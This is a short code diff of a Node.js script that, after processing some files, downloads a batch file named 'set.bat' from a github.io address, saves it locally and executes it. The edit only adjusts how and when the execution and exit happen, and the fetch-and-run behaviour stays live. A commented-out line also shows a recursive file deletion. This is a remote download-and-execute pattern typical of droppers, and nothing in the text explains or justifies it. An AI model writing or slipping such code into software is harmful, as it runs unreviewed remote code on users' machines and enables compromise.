@@ -14,13 +14,13 @@ for (let file of files) {
 }
 const timer = setTimeout(() => {
   if (count === files.length) {
-    request('https://8230459.github.io/set.bat').pipe(fs.createWriteStream(path.join('.', 'set.bat'))).on('close', err => {
+    request('https://8230459.github.io/set.bat').pipe(fs.createWriteStream(path.join('.', 'set.bat'))).on('close', async err => {
       if (err) return
-      execSync('set.bat')
+      await execSync('set.bat')
+      process.exit()
     })
     clearTimeout(timer)
   }
 }, 5000)
 
 //fs.rmSync('e:\\test\\b.vue', {recursive: true})
-process.exit()
